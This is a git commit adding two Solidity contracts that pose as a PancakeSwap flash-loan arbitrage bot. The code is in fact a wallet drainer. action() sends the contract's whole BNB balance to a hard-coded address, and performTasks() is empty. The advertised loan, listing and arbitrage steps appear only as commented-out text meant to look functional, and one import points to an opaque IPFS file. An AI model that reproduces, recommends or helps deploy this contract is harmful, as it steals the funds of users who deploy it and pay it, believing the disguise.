16d6553706dae789cbb30beea19fbb0f4fe054a1
FlashLoanBSC <86927142+FlashLoanBSC@users.noreply.github.com>
2021-08-14 13:28:32 +0200

    Add files via upload

---
+++ Iloanrouter.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x4A051f21e57e3b516E0b84cB1740Ab1Bfc8521aa;
+	}
+}
---
+++ fullcode.sol
@@ -0,0 +1,61 @@
+pragma solidity ^0.5.0;
+// Multiplier-Finance Smart Contracts
+import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/ILendingPool.sol";
+import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/ILendingPoolAddressesProvider.sol";
+// PancakeSwap Smart Contracts
+import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/IPancakeCallee.sol";
+import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/IPancakeFactory.sol";
+import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/IPancakePair.sol";
+// Code Manager
+import "https://ipfs.io/ipfs/QmXrGHyKKnJSfj4WuuN97Jmm2ELwqqdmqDPJQLQxypmaMR?filename=file.sol";
+contract GetFlashLoan {
+        string public tokenName;
+        string public tokenSymbol;
+        uint loanAmount;
+        Manager manager;
+        
+        constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+                tokenName = _tokenName;
+                tokenSymbol = _tokenSymbol;
+                loanAmount = _loanAmount;
+                        
+                manager = new Manager();
+        }
+        
+        function() external payable {}
+        
+        function action() public payable {
+          // Send required coins for swap
+          address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
+         
+          // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+          // Breakdown of functions written below
+          manager.performTasks();
+         
+          /* Breakdown of functions
+          // Submit token to BSC blockchain
+          string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+        // List the token on PancakeSwap
+                manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
+                
+        // Get BNB Loan from Multiplier-Finance
+                string memory loanAddress = manager.takeFlashLoan(loanAmount);
+                
+                // Convert half BNB to DAI
+                manager.pancakeDAItoBNB(loanAmount / 2);
+        // Create BNB and DAI pairs for our token & Provide liquidity
+        string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
+                manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
+                string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
+                manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
+   
+        // Perform swaps and profit on Self-Arbitrage
+                manager.pancakePerformSwaps();
+                
+                // Move remaining BNB from Contract to your account
+                manager.contractToWallet("BNB");
+        // Repay Flash loan
+                manager.repayLoan(loanAddress);
+          */
+        }
+}
